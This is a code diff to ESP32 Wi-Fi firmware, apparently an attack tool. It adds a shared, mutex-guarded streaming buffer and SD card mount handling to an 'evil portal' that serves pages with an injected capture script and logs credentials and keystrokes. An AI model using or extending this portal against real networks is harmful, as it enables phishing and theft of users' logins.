@@ -11,6 +11,7 @@
 #include "esp_wifi.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/event_groups.h"
+#include "freertos/semphr.h"
 #include "lwip/etharp.h"
 #include "lwip/netif.h"
 #include "lwip/ip4_addr.h"
@@ -295,6 +296,25 @@ static const char CAPTURE_JS_SNIPPET[] =
 static char* html_buffer = NULL;
 static size_t html_buffer_size = 0;
 static bool use_html_buffer = false;
+// jit sd mount state for portal (somethingsomething template)
+static bool portal_sd_jit_mounted = false;
+static bool portal_display_suspended = false;
+
+// single reusable transfer buffer for streaming to reduce heap churn
+static char g_stream_buf[CHUNK_SIZE + 1];
+static SemaphoreHandle_t g_stream_buf_mutex = NULL;
+static inline bool stream_buf_lock(void) {
+    if (g_stream_buf_mutex == NULL) {
+        g_stream_buf_mutex = xSemaphoreCreateMutex();
+        if (g_stream_buf_mutex == NULL) return false;
+    }
+    return xSemaphoreTake(g_stream_buf_mutex, portMAX_DELAY) == pdTRUE;
+}
+static inline void stream_buf_unlock(void) {
+    if (g_stream_buf_mutex) {
+        xSemaphoreGive(g_stream_buf_mutex);
+    }
+}
 
 // Station Scan Channel Hopping Globals
 static esp_timer_handle_t scansta_channel_hop_timer = NULL;
@@ -755,11 +775,17 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
         httpd_resp_set_type(req, content_type ? content_type : "application/octet-stream");
         httpd_resp_set_status(req, "200 OK");
 
-        char *buffer = (char *)malloc(CHUNK_SIZE + 1);
-        if (buffer == NULL) {
-            printf("Error: buffer allocation failed\n");
-            fclose(file);
-            return ESP_FAIL;
+        char *buffer = NULL;
+        bool used_global = false;
+        if (stream_buf_lock()) {
+            buffer = g_stream_buf;
+            used_global = true;
+        } else {
+            buffer = (char *)malloc(CHUNK_SIZE + 1);
+            if (buffer == NULL) {
+                fclose(file);
+                return ESP_FAIL;
+            }
         }
 
         int read_len;
@@ -774,7 +800,11 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
             httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
         }
 
-        free(buffer);
+        if (used_global) {
+            stream_buf_unlock();
+        } else {
+            free(buffer);
+        }
         fclose(file);
         httpd_resp_send_chunk(req, NULL, 0);
         printf("Served file: %s\n", url);
@@ -835,11 +865,17 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
                                "connect-src 'self' data: blob:;");
             httpd_resp_set_status(req, "200 OK");
 
-            char *buffer = (char *)malloc(CHUNK_SIZE + 1);
-            if (buffer == NULL) {
-                printf("Failed to allocate memory for buffer");
-                esp_http_client_cleanup(client);
-                return ESP_FAIL;
+            char *buffer = NULL;
+            bool used_global = false;
+            if (stream_buf_lock()) {
+                buffer = g_stream_buf;
+                used_global = true;
+            } else {
+                buffer = (char *)malloc(CHUNK_SIZE + 1);
+                if (buffer == NULL) {
+                    esp_http_client_cleanup(client);
+                    return ESP_FAIL;
+                }
             }
 
             int read_len;
@@ -875,7 +911,11 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
                 }
             }
 
-            free(buffer);
+            if (used_global) {
+                stream_buf_unlock();
+            } else {
+                free(buffer);
+            }
             esp_http_client_close(client);
             esp_http_client_cleanup(client);
 
@@ -1269,6 +1309,18 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
     login_done = false; // Reset login state on start
     current_creds_filename[0] = '\0'; // Reset filenames at the start
     current_keystrokes_filename[0] = '\0';
+    portal_sd_jit_mounted = false;
+    portal_display_suspended = false;
+    // jit mount sd for somethingsomething template only
+#ifdef CONFIG_BUILD_CONFIG_TEMPLATE
+    if (strcmp(CONFIG_BUILD_CONFIG_TEMPLATE, "somethingsomething") == 0) {
+        if (!sd_card_manager.is_initialized) {
+            if (sd_card_mount_for_flush(&portal_display_suspended) == ESP_OK) {
+                portal_sd_jit_mounted = true;
+            }
+        }
+    }
+#endif
     // Log HTML buffer state at portal startup
     ESP_LOGI(TAG, "Evil portal starting - HTML buffer state: buffer=%p, size=%zu, use_html_buffer=%s", 
         html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
@@ -1423,6 +1475,13 @@ void wifi_manager_stop_evil_portal() {
     ESP_ERROR_CHECK(esp_wifi_stop());
 
     ap_manager_init();
+
+    // jit unmount sd if we mounted it for portal start
+    if (portal_sd_jit_mounted) {
+        sd_card_unmount_after_flush(portal_display_suspended);
+        portal_sd_jit_mounted = false;
+        portal_display_suspended = false;
+    }
 }
 
 bool wifi_manager_is_evil_portal_active(void) {
@@ -1444,9 +1503,6 @@ void wifi_manager_clear_scan_results(void) {
 }
 
 void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
-    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
-    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
     ESP_ERROR_CHECK(esp_wifi_start());
 
